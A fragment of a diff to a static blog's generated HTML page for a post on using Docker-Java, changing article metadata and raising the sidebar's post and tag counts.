+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2023/11/01/2023-11-01-Docker-Java%20%E4%BD%BF%E7%94%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -395,7 +639,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-count">13</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -408,7 +652,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
